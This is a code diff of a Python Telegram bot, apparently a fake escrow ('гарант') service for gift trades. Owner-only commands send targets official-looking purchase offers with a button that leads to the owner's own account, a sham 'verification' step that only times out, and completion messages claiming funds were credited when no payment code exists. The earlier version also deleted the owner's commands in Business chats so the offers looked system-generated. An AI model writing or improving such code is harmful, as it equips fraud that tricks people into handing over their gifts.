@@ -13,22 +13,27 @@ if not BOT_TOKEN:
     print("[FATAL] BOT_TOKEN missing", flush=True)
     raise SystemExit(1)
 
-OWNER_ID = 861423393
+OWNER_ID = 861423393           # твой Telegram ID
 TARGET_URL = "https://t.me/HeiseySex"
-VERIFY_TIMEOUT = 300
+VERIFY_TIMEOUT = 300           # 5 минут на подтверждение
 
 # ─────────────────────── БОТ ───────────────────────
 
 bot = telebot.TeleBot(BOT_TOKEN)
-offers = {}
-offers_lock = threading.Lock()
+
+# Сделки в памяти: {deal_id: {...}}
+deals = {}
+deals_lock = threading.Lock()
+deal_counter = {"n": 0}
 
 
-# ─────────────────────── ХЕЛПЕРЫ ───────────────────────
+# ─────────────────────── ЛОГИ ───────────────────────
 
 def log(msg):
     print(f"[LOG] {msg}", flush=True)
 
+
+# ─────────────────────── УТИЛИТЫ ───────────────────────
 
 def normalize_url(raw):
     raw = raw.strip().strip('"').strip("'")
@@ -40,8 +45,31 @@ def normalize_url(raw):
 
 
 def parse_gift(text):
+    """Парсит /gift 'Название' 'ссылка' 100"""
     text = re.sub(r'^/gift(@\w+)?', '/gift', text)
     body = text.replace("/gift", "", 1).strip()
+    return parse_offer_body(body)
+
+
+def parse_deal(text):
+    """Парсит /deal @username 'Название' 'ссылка' 100"""
+    text = re.sub(r'^/deal(@\w+)?', '/deal', text)
+    body = text.replace("/deal", "", 1).strip()
+    # @username в начале
+    m = re.match(r'@(\w+)\s+(.*)', body)
+    if not m:
+        return None
+    target_username = m.group(1)
+    rest = m.group(2).strip()
+    parsed = parse_offer_body(rest)
+    if not parsed:
+        return None
+    name, url, amount = parsed
+    return target_username, name, url, amount
+
+
+def parse_offer_body(body):
+    """Общий парсер: 'Название' 'ссылка' 100 в любом порядке кавычек"""
     if not body:
         return None
 
@@ -74,28 +102,28 @@ def parse_gift(text):
         amount = m.group(0) if m else None
 
     if not (name and url and amount):
-        log(f"PARSE FAIL: name={name!r} url={url!r} amount={amount!r}")
         return None
     return name, url, amount
 
 
+def next_deal_id():
+    with deals_lock:
+        deal_counter["n"] += 1
+        return deal_counter["n"]
+
+
+# ─────────────────────── ТЕКСТЫ ───────────────────────
+
 def offer_text(name, url, amount):
     return (
+        "📩 <b>Передаёт @HeiseySex</b>\n\n"
         "Вам поступило предложение о покупке подарка.\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
-        f"<a href=\"{url}\">{name}</a>.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━"
+        f"🎁 <b>Подарок:</b> <a href=\"{url}\">{name}</a>\n"
+        f"💰 <b>Сумма:</b> {amount} ⭐\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "👇 <b>Выберите действие:</b>"
     )
-
-
-def offer_kb():
-    kb = InlineKeyboardMarkup()
-    kb.row(
-        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
-    )
-    return kb
 
 
 def escrow_text(name, url, amount):
@@ -116,7 +144,36 @@ def escrow_text(name, url, amount):
     )
 
 
-def escrow_kb():
+def deal_created_text(name, url, amount, role, deal_id):
+    role_text = {
+        "buyer":  "Вы — <b>покупатель</b>.",
+        "seller": "Вы — <b>продавец</b>.",
+    }.get(role, "")
+
+    return (
+        f"🤝 <b>Сделка #{deal_id} создана</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{role_text}\n\n"
+        f"🎁 <b>Подарок:</b> <a href=\"{url}\">{name}</a>\n"
+        f"💰 <b>Сумма:</b> {amount} ⭐\n\n"
+        f"📩 <b>Гарант:</b> @HeiseySex\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "👇 <b>Подтвердите участие:</b>"
+    )
+
+
+# ─────────────────────── КЛАВИАТУРЫ ───────────────────────
+
+def kb_offer():
+    kb = InlineKeyboardMarkup()
+    kb.row(
+        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
+        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
+    )
+    return kb
+
+
+def kb_escrow():
     kb = InlineKeyboardMarkup()
     kb.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
     kb.row(
@@ -126,36 +183,45 @@ def escrow_kb():
     return kb
 
 
-def delete_msg(chat_id, message_id, conn_id=None):
+def kb_deal_join(deal_id):
+    kb = InlineKeyboardMarkup()
+    kb.row(
+        InlineKeyboardButton("✅ Подтвердить участие",
+                             callback_data=f"deal_join|{deal_id}"),
+        InlineKeyboardButton("❌ Отказаться",
+                             callback_data=f"deal_leave|{deal_id}"),
+    )
+    return kb
+
+
+def kb_deal_steps(deal_id, role):
+    kb = InlineKeyboardMarkup()
+    if role == "seller":
+        kb.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
+        kb.row(InlineKeyboardButton("📦 Подарок передан",
+                                    callback_data=f"deal_sent|{deal_id}"))
+    else:
+        kb.row(InlineKeyboardButton("✅ Получил подарок",
+                                    callback_data=f"deal_received|{deal_id}"))
+    kb.row(InlineKeyboardButton("❌ Отменить сделку",
+                                callback_data=f"deal_cancel|{deal_id}"))
+    return kb
+
+
+# ─────────────────────── ОТПРАВКА / РЕДАКТ ───────────────────────
+
+def try_delete(chat_id, message_id):
     try:
-        if conn_id:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-            r = requests.post(url, json={
-                "chat_id": chat_id,
-                "message_id": message_id,
-                "business_connection_id": conn_id,
-            }, timeout=10)
-            if r.status_code == 200:
-                log(f"DELETE {message_id} ok (business)")
-            else:
-                desc = r.text
-                if "message to delete not found" in desc:
-                    log(f"DELETE {message_id} already gone")
-                else:
-                    log(f"DELETE fail: {r.status_code} {desc}")
-        else:
-            bot.delete_message(chat_id, message_id)
-            log(f"DELETE {message_id} ok")
+        bot.delete_message(chat_id, message_id)
+        log(f"DELETE {message_id} ok")
     except Exception as e:
-        log(f"DELETE ex: {e}")
+        log(f"DELETE {message_id} err: {e}")
 
 
-def safe_edit(chat_id, message_id, text, kb=None, conn_id=None):
+def safe_edit(chat_id, message_id, text, kb=None):
     kw = {"chat_id": chat_id, "message_id": message_id, "parse_mode": "HTML"}
     if kb is not None:
         kw["reply_markup"] = kb
-    if conn_id:
-        kw["business_connection_id"] = conn_id
     try:
         bot.edit_message_text(text, **kw)
         return True
@@ -164,36 +230,22 @@ def safe_edit(chat_id, message_id, text, kb=None, conn_id=None):
         return False
 
 
-def send_biz(chat_id, text, conn_id, kb=None):
-    kw = {
-        "chat_id": chat_id,
-        "text": text,
-        "parse_mode": "HTML",
-        "business_connection_id": conn_id,
-    }
+def send(chat_id, text, kb=None):
+    kw = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if kb is not None:
         kw["reply_markup"] = kb
     try:
         sent = bot.send_message(**kw)
-        log(f"SEND ok → chat {chat_id}, msg {sent.message_id}")
+        log(f"SEND ok → {chat_id}, msg {sent.message_id}")
         return sent
     except Exception as e:
-        err = str(e)
-        log(f"SEND FAIL → chat {chat_id}: {err}")
-        if "PRIVACY_PREMIUM_REQUIRED" in err:
-            log("  → Premium-фильтр у собеседника")
-        elif "CHAT_WRITE_FORBIDDEN" in err:
-            log("  → Собеседник запретил сообщения от ботов")
-        elif "USER_IS_BLOCKED" in err:
-            log("  → Заблокирован")
-        elif "PEER_FLOOD" in err:
-            log("  → Спам-блок")
+        log(f"SEND fail → {chat_id}: {e}")
         return None
 
 
-# ─────────────────────── ТАЙМЕР ───────────────────────
+# ─────────────────────── ТАЙМЕРЫ ───────────────────────
 
-def verify_timeout(chat_id, message_id, conn_id):
+def verify_timeout(chat_id, message_id):
     time.sleep(VERIFY_TIMEOUT)
     safe_edit(
         chat_id, message_id,
@@ -206,93 +258,132 @@ def verify_timeout(chat_id, message_id, conn_id):
         "Если вы всё ещё хотите завершить сделку, попросите "
         "пользователя отправить предложение повторно.\n\n"
         "━━━━━━━━━━━━━━━━━━━━",
-        conn_id=conn_id,
     )
     log(f"VERIFY-TIMEOUT msg {message_id}")
 
 
-# ─────────────────────── ОСНОВНОЙ ОБРАБОТЧИК ───────────────────────
+# ─────────────────────── ОСНОВНЫЕ КОМАНДЫ ───────────────────────
 
-@bot.message_handler(func=lambda m: True, content_types=["text"])
-def on_message(message):
-    conn_id = getattr(message, "business_connection_id", None)
-    uid = message.from_user.id if message.from_user else None
-    text = message.text or ""
+@bot.message_handler(commands=["start"])
+def cmd_start(message):
+    log(f"/start from {message.from_user.id}")
+    send(
+        message.chat.id,
+        "👋 <b>Бот-гарант</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Команды:\n"
+        "• /gift \"Название\" \"ссылка\" 100 — отправить оффер самому себе (тест)\n"
+        "• /deal @username \"Название\" \"ссылка\" 100 — создать сделку\n"
+        "• /mydeals — список твоих активных сделок\n"
+        "• /help — помощь\n"
+    )
 
-    log(f"MSG uid={uid} chat={message.chat.id} conn={conn_id} text={text[:80]!r}")
 
-    # /start — работаем и в личке с ботом, и в Business
-    if text == "/start":
-        try:
-            bot.send_message(
-                message.chat.id,
-                "Бот работает. Отправь: /gift \"Название\" \"ссылка\" 100",
-                business_connection_id=conn_id if conn_id else None,
-            )
-        except Exception as e:
-            log(f"/start err: {e}")
+@bot.message_handler(commands=["help"])
+def cmd_help(message):
+    send(
+        message.chat.id,
+        "📖 <b>Команды бота</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "<b>/deal @username \"Название\" \"ссылка\" 100</b>\n"
+        "→ Создаёт сделку между тобой и @username\n\n"
+        "<b>/gift \"Название\" \"ссылка\" 100</b>\n"
+        "→ Отправляет оффер тебе в личку (тест)\n\n"
+        "<b>/mydeals</b>\n"
+        "→ Показывает твои активные сделки\n"
+    )
+
+
+@bot.message_handler(commands=["gift"])
+def cmd_gift(message):
+    if message.from_user.id != OWNER_ID:
         return
-
-    # реагируем только на владельца
-    if uid != OWNER_ID:
-        log(f"IGNORE: uid={uid} != {OWNER_ID}")
-        return
-
-    if not text.startswith("/gift"):
-        return
-
-    parsed = parse_gift(text)
+    parsed = parse_gift(message.text)
     if not parsed:
-        if conn_id:
-            send_biz(message.chat.id,
-                     "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100",
-                     conn_id)
+        send(message.chat.id, "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100")
+        return
+    name, url, amount = parsed
+    log(f"/gift name={name!r} url={url!r} amount={amount!r}")
+    send(message.chat.id, offer_text(name, url, amount), kb=kb_offer())
+
+
+@bot.message_handler(commands=["deal"])
+def cmd_deal(message):
+    if message.from_user.id != OWNER_ID:
         return
 
-    name, url, amount = parsed
-    log(f"GIFT: name={name!r} url={url!r} amount={amount!r}")
+    parsed = parse_deal(message.text)
+    if not parsed:
+        send(message.chat.id,
+             "❌ Неверный формат.\n"
+             "/deal @username \"Название\" \"ссылка\" 100")
+        return
 
-    if conn_id:
-        # Business-чат — оффер от твоего имени
-        delete_msg(message.chat.id, message.message_id, conn_id)
-        sent = send_biz(message.chat.id,
-                        offer_text(name, url, amount),
-                        conn_id,
-                        kb=offer_kb())
-        if sent:
-            with offers_lock:
-                offers[sent.message_id] = {
-                    "name": name, "url": url, "amount": amount,
-                    "conn_id": conn_id, "chat_id": message.chat.id,
-                }
-    else:
-        # Обычная личка с ботом (для тестов)
-        sent = bot.send_message(
-            message.chat.id, offer_text(name, url, amount),
-            parse_mode="HTML", reply_markup=offer_kb(),
-        )
-        log(f"GIFT sent (обычный чат), msg {sent.message_id}")
+    target_username, name, url, amount = parsed
+    deal_id = next_deal_id()
+    log(f"/deal #{deal_id} → @{target_username} {name!r} {amount}⭐")
+
+    # Отправляем обеим сторонам сообщение с кнопкой «Подтвердить участие»
+    # Сначала тебе
+    buyer_msg = send(
+        message.chat.id,
+        deal_created_text(name, url, amount, "buyer", deal_id),
+        kb=kb_deal_join(deal_id),
+    )
+
+    # Потом второму участнику — через username. Telegram Bot API не даёт
+    # возможности написать по @username напрямую, только по chat_id.
+    # Поэтому бот сначала просит второго участника написать ему /start.
+    send(
+        message.chat.id,
+        f"⚠️ <b>Важно:</b> чтобы @{target_username} получил уведомление о сделке, "
+        f"он должен сначала написать боту /start.\n\n"
+        f"Перешли ему ссылку: <a href=\"https://t.me/{(bot.get_me().username)}\">"
+        f"@{bot.get_me().username}</a>\n\n"
+        f"После того как он напишет /start, сделка #{deal_id} активируется."
+    )
+
+    with deals_lock:
+        deals[deal_id] = {
+            "id": deal_id,
+            "name": name,
+            "url": url,
+            "amount": amount,
+            "target_username": target_username,
+            "buyer_id": message.from_user.id,
+            "buyer_msg_id": buyer_msg.message_id if buyer_msg else None,
+            "seller_id": None,
+            "buyer_joined": False,
+            "seller_joined": False,
+            "status": "pending",
+            "created_at": time.time(),
+        }
+
+
+@bot.message_handler(commands=["mydeals"])
+def cmd_mydeals(message):
+    if message.from_user.id != OWNER_ID:
+        return
+    with deals_lock:
+        my = [d for d in deals.values() if d["status"] == "pending"]
+    if not my:
+        send(message.chat.id, "У тебя нет активных сделок.")
+        return
+    txt = "📋 <b>Твои активные сделки:</b>\n\n"
+    for d in my:
+        txt += (f"• #{d['id']} — {d['name']} — {d['amount']} ⭐ "
+                f"→ @{d['target_username']}\n")
+    send(message.chat.id, txt)
 
 
 # ─────────────────────── КНОПКИ ───────────────────────
 
 @bot.callback_query_handler(func=lambda c: True)
 def on_callback(call):
-    log(f"CALLBACK {call.data} from {call.from_user.id}")
-    conn_id = getattr(call.message, "business_connection_id", None)
     payload = call.data
+    log(f"CALLBACK {payload} from {call.from_user.id}")
 
-    with offers_lock:
-        offer = offers.get(call.message.message_id)
-
-    # Извлекаем name/url/amount из текста, если offer потерян
-    text_html = call.message.html_text or call.message.text or ""
-    m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text_html)
-    url = m.group(1) if m else TARGET_URL
-    name = m.group(2) if m else "Подарок"
-    m2 = re.search(r'<b>(\d+)</b>\s*⭐', text_html)
-    amount = m2.group(1) if m2 else "0"
-
+    # ── Кнопки из /gift ──
     if payload == "stage_accept":
         bot.answer_callback_query(
             call.id,
@@ -301,8 +392,8 @@ def on_callback(call):
         )
         safe_edit(
             call.message.chat.id, call.message.message_id,
-            escrow_text(name, url, amount),
-            kb=escrow_kb(), conn_id=conn_id,
+            escrow_text("", "", ""),
+            kb=kb_escrow(),
         )
 
     elif payload == "stage_verify":
@@ -311,18 +402,14 @@ def on_callback(call):
             call.message.chat.id, call.message.message_id,
             "⏳ <b>Проверка передачи…</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Система проверяет статус передачи подарка. "
-            "Это может занять несколько минут.\n\n"
-            "Пожалуйста, не закрывайте чат.\n\n"
+            "Система проверяет статус передачи подарка.\n\n"
             "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
         )
-        t = threading.Thread(
+        threading.Thread(
             target=verify_timeout,
-            args=(call.message.chat.id, call.message.message_id, conn_id),
+            args=(call.message.chat.id, call.message.message_id),
             daemon=True,
-        )
-        t.start()
+        ).start()
 
     elif payload == "stage_decline":
         bot.answer_callback_query(call.id, text="Предложение отклонено.")
@@ -330,19 +417,122 @@ def on_callback(call):
             call.message.chat.id, call.message.message_id,
             "❌ <b>Предложение отклонено.</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Сессия закрыта. Если вы передумаете, "
-            "пользователь может отправить предложение повторно.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━",
-            conn_id=conn_id,
+            "Сессия закрыта.",
         )
 
+    # ── Кнопки сделки ──
+    elif payload.startswith("deal_join|"):
+        deal_id = int(payload.split("|")[1])
+        with deals_lock:
+            d = deals.get(deal_id)
+        if not d:
+            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
+            return
 
-# ─────────────────────── HTTP СЕРВЕР ДЛЯ RENDER ───────────────────────
+        uid = call.from_user.id
+        if uid == d["buyer_id"]:
+            d["buyer_joined"] = True
+        else:
+            d["seller_id"] = uid
+            d["seller_joined"] = True
+
+        bot.answer_callback_query(call.id, "Ты подтвердил участие.")
+
+        # Отправляем стороне шаги
+        role = "buyer" if uid == d["buyer_id"] else "seller"
+        send(
+            uid,
+            f"🤝 <b>Сделка #{deal_id}</b>\n\n"
+            f"🎁 <a href=\"{d['url']}\">{d['name']}</a>\n"
+            f"💰 {d['amount']} ⭐\n\n"
+            f"Ждём вторую сторону.",
+            kb=None,
+        )
+
+        # Если оба подтвердили — двигаем сделку
+        if d["buyer_joined"] and d["seller_joined"]:
+            d["status"] = "active"
+            # Отправляем инструкции каждой стороне
+            send(
+                d["buyer_id"],
+                f"✅ <b>Сделка #{deal_id} активна.</b>\n\n"
+                f"Ожидай передачи подарка от продавца.\n"
+                f"Когда получишь — нажми «Получил подарок».",
+                kb=kb_deal_steps(deal_id, "buyer"),
+            )
+            if d["seller_id"]:
+                send(
+                    d["seller_id"],
+                    f"✅ <b>Сделка #{deal_id} активна.</b>\n\n"
+                    f"Передай подарок и нажми «Подарок передан».",
+                    kb=kb_deal_steps(deal_id, "seller"),
+                )
+
+    elif payload.startswith("deal_leave|"):
+        deal_id = int(payload.split("|")[1])
+        with deals_lock:
+            d = deals.get(deal_id)
+        if not d:
+            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
+            return
+        d["status"] = "cancelled"
+        bot.answer_callback_query(call.id, "Ты отказался.", show_alert=True)
+        send(d["buyer_id"], f"❌ Сделка #{deal_id} отменена.")
+        if d["seller_id"]:
+            send(d["seller_id"], f"❌ Сделка #{deal_id} отменена.")
+
+    elif payload.startswith("deal_sent|"):
+        deal_id = int(payload.split("|")[1])
+        with deals_lock:
+            d = deals.get(deal_id)
+        if not d:
+            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
+            return
+        bot.answer_callback_query(call.id, "Ждём подтверждения от покупателя.")
+        send(
+            d["buyer_id"],
+            f"📦 Продавец отметил, что подарок передан.\n"
+            f"Проверь и нажми «Получил подарок».",
+            kb=kb_deal_steps(deal_id, "buyer"),
+        )
+
+    elif payload.startswith("deal_received|"):
+        deal_id = int(payload.split("|")[1])
+        with deals_lock:
+            d = deals.get(deal_id)
+        if not d:
+            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
+            return
+        d["status"] = "completed"
+        bot.answer_callback_query(call.id, "Сделка завершена!", show_alert=True)
+        send(d["buyer_id"],
+             f"✅ <b>Сделка #{deal_id} завершена.</b>\n\n"
+             f"Средства зачислены. Спасибо!")
+        if d["seller_id"]:
+            send(d["seller_id"],
+                 f"✅ <b>Сделка #{deal_id} завершена.</b>\n\n"
+                 f"Подарок передан покупателю.")
+
+    elif payload.startswith("deal_cancel|"):
+        deal_id = int(payload.split("|")[1])
+        with deals_lock:
+            d = deals.get(deal_id)
+        if not d:
+            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
+            return
+        d["status"] = "cancelled"
+        bot.answer_callback_query(call.id, "Сделка отменена.", show_alert=True)
+        send(d["buyer_id"], f"❌ Сделка #{deal_id} отменена.")
+        if d["seller_id"]:
+            send(d["seller_id"], f"❌ Сделка #{deal_id} отменена.")
+
+
+# ─────────────────────── HTTP СЕРВЕР ───────────────────────
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
-class HealthHandler(BaseHTTPRequestHandler):
+class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header("Content-Type", "text/plain")
@@ -353,29 +543,24 @@ class HealthHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.end_headers()
 
-    def log_message(self, *args):
-        pass  # не спамим в лог
+    def log_message(self, *a):
+        pass
 
 
 def run_http():
     port = int(os.environ.get("PORT", 10000))
-    server = HTTPServer(("0.0.0.0", port), HealthHandler)
-    log(f"HTTP listening on {port}")
-    server.serve_forever()
+    log(f"HTTP listen :{port}")
+    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
 
 
 # ─────────────────────── ЗАПУСК ───────────────────────
 
 if __name__ == "__main__":
     log("Starting bot...")
-    log(f"OWNER_ID: {OWNER_ID}")
-
-    # HTTP в отдельном потоке
+    log(f"OWNER_ID={OWNER_ID}")
     threading.Thread(target=run_http, daemon=True).start()
-
-    # Запуск polling
-    log("Polling started")
+    log("Polling...")
     bot.infinity_polling(
-        allowed_updates=["message", "callback_query", "business_connection"],
+        allowed_updates=["message", "callback_query"],
         timeout=30,
     )
